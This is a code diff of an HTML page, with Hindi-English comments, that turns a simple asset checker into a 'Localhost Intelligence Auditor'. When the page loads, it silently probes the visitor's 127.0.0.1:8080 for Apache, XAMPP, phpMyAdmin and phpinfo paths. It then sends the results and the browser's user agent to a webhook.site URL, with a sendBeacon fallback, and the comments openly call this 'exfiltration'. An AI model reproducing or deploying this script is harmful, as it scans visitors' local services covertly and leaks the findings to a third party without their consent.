@@ -2,86 +2,117 @@
 <html lang="hi">
 <head>
     <meta charset="UTF-8">
-    <title>Strict 200 OK Auditor</title>
+    <title>Service Mapper Pro - Webhook Fixed</title>
     <style>
-        :root { --glow: #00ff41; --bg: #050505; }
-        body { background: var(--bg); color: var(--glow); font-family: 'Consolas', monospace; padding: 40px; }
-        .terminal { background: #000; border: 1px solid var(--glow); height: 500px; overflow-y: auto; padding: 20px; box-shadow: 0 0 20px rgba(0,255,65,0.2); border-radius: 10px; }
-        .found { color: #000; background: var(--glow); font-weight: bold; padding: 5px; margin: 5px 0; border-radius: 3px; }
-        .header { text-align: center; border-bottom: 1px solid var(--glow); padding-bottom: 10px; margin-bottom: 20px; }
+        body { background-color: #0e1013; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #161b22; width: 620px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #30363d; overflow: hidden; }
+        .header { background: #21262d; padding: 20px; text-align: center; border-bottom: 1px solid #30363d; }
+        h2 { margin: 0; color: #58a6ff; font-weight: 500; }
+        .terminal { padding: 20px; height: 350px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 14px; line-height: 1.6; background: #0d1117; }
+        .line { margin-bottom: 8px; border-bottom: 1px solid #1f242c; padding-bottom: 4px; }
+        .tag { padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; text-transform: uppercase; margin-right: 10px; }
+        .tag-found { background: #238636; color: white; }
+        .tag-missing { background: #da3633; color: white; }
+        .tag-info { background: #388bfd; color: white; }
+        .footer { padding: 15px; text-align: center; font-size: 12px; color: #8b949e; background: #161b22; }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <h1>Firefox Strict Asset Auditor</h1>
-        <p style="color: #888;">Only reporting 100% Verified (200 OK) Assets</p>
-    </div>
-
-    <div id="log" class="terminal">> Waiting for page load...</div>
+<div class="card">
+    <div class="header"><h2>Localhost Intelligence Auditor</h2></div>
+    <div id="log" class="terminal"><div class="line"><span class="tag tag-info">SYSTEM</span> Initializing Deep Scan...</div></div>
+    <div class="footer">Targeting: 127.0.0.1:8080 | Status: <span id="status">Scanning...</span></div>
+</div>
 
 <script>
+    // TERA WEBHOOK URL
     const WEBHOOK = "https://webhook.site/5c8dfb93-43de-4bdc-8216-4895cb4b323d";
     const logBox = document.getElementById('log');
+    const statusText = document.getElementById('status');
 
-    function print(msg, isFound = false) {
+    function log(msg, type = "info") {
         const div = document.createElement('div');
-        if (isFound) div.className = 'found';
-        div.innerHTML = `> [${new Date().toLocaleTimeString()}] ${msg}`;
+        div.className = "line";
+        let tagClass = type === "found" ? "tag-found" : (type === "error" ? "tag-missing" : "tag-info");
+        let tagName = type === "found" ? "FOUND" : (type === "error" ? "MISSING" : "INFO");
+        div.innerHTML = `<span class="tag ${tagClass}">${tagName}</span> ${msg}`;
         logBox.appendChild(div);
         logBox.scrollTop = logBox.scrollHeight;
     }
 
-    // Yeh function sirf 200 OK par hi true return karega
-    async function verifyAssetStrict(path) {
+    async function checkAsset(name, path, isHTML = false) {
         return new Promise((resolve) => {
-            const img = new Image();
-            
-            // Onload ka matlab hai server ne 200 OK bhej diya aur image load ho gayi
-            img.onload = () => resolve(true);
-            
-            // Onerror ka matlab hai 404, 403, ya Connection Refused
-            img.onerror = () => resolve(false);
-            
-            img.src = `http://127.0.0.1/${path}?verify=${Date.now()}`;
-            
-            // 2 second ka timeout agar port block ho toh
-            setTimeout(() => resolve(false), 2000);
+            if (isHTML) {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 2000);
+
+                fetch(`http://127.0.0.1:8080${path}`, { mode: 'no-cors', signal: controller.signal })
+                    .then(() => {
+                        log(`${name} page detected at ${path}`, "found");
+                        resolve({ name, path, status: "FOUND", type: "HTML" });
+                    })
+                    .catch(() => {
+                        log(`${name} not found`, "error");
+                        resolve({ name, path, status: "MISSING", type: "HTML" });
+                    });
+            } else {
+                const img = new Image();
+                img.onload = () => {
+                    log(`${name} asset detected at ${path}`, "found");
+                    resolve({ name, path, status: "FOUND", type: "IMAGE" });
+                };
+                img.onerror = () => {
+                    log(`${name} not found`, "error");
+                    resolve({ name, path, status: "MISSING", type: "IMAGE" });
+                };
+                img.src = `http://127.0.0.1:8080${path}?t=${Date.now()}`;
+                setTimeout(() => resolve({ name, path, status: "TIMEOUT", type: "IMAGE" }), 2500);
+            }
         });
     }
 
     window.onload = async function() {
-        print("Starting Strict 200 OK Scan on Port 8080...");
+        log("Checking Port 8080 for active services...");
 
         const targets = [
-            { name: "Apache Welcome Sign", path: "/icons/apache_pb.png" },
-            { name: "XAMPP Dashboard Logo", path: "/dashboard/images/xampp-logo.svg" },
-            { name: "Favicon Asset", path: "/favicon.ico" }
+            { name: "Apache Welcome", path: "/icons/apache_pb.png", html: false },
+            { name: "XAMPP Dashboard Logo", path: "/dashboard/images/xampp-logo.svg", html: false },
+            { name: "PHPMyAdmin Index", path: "/phpmyadmin/index.php", html: true },
+            { name: "PHP Info Page", path: "/dashboard/phpinfo.php", html: true },
+            { name: "Local Favicon", path: "/favicon.ico", html: false }
         ];
 
-        let discovered = [];
+        let scanResults = [];
 
         for (let t of targets) {
-            print(`Testing path: ${t.path} ...`);
-            const isFound = await verifyAssetStrict(t.path);
-            
-            if (isFound) {
-                print(`VERIFIED FOUND (200 OK): ${t.name}`, true);
-                discovered.push(t);
-            }
+            const res = await checkAsset(t.name, t.path, t.html);
+            scanResults.push(res);
         }
 
-        if (discovered.length > 0) {
-            print("Sending verified results to Webhook...");
-            fetch(WEBHOOK, { 
-                method: 'POST', 
-                mode: 'no-cors', 
-                body: JSON.stringify({ status: "Verified_200_OK", assets: discovered }) 
-            });
-            print("Audit Data Exfiltrated.", true);
-        } else {
-            print("No 100% verified assets found on 127.0.0.1:8080.");
-        }
+        statusText.innerText = "Audit Complete";
+        statusText.style.color = "#58a6ff";
+
+        // SABHI DATA WEBHOOK PE BHEJNA (FOUND aur MISSING dono)
+        log(`Exfiltrating full audit report to Webhook...`);
+        
+        // POST request with stringified body
+        fetch(WEBHOOK, {
+            method: 'POST',
+            mode: 'no-cors', // Firefox default settings bypass
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                timestamp: new Date().toISOString(),
+                browser: navigator.userAgent,
+                results: scanResults
+            })
+        }).then(() => {
+            log("Report successfully exfiltrated.", "found");
+        }).catch(err => {
+            // Backup method: Beacon API (bahut reliable hai data exfiltration ke liye)
+            navigator.sendBeacon(WEBHOOK, JSON.stringify(scanResults));
+            log("Report sent via backup beacon.");
+        });
     };
 </script>
 </body>
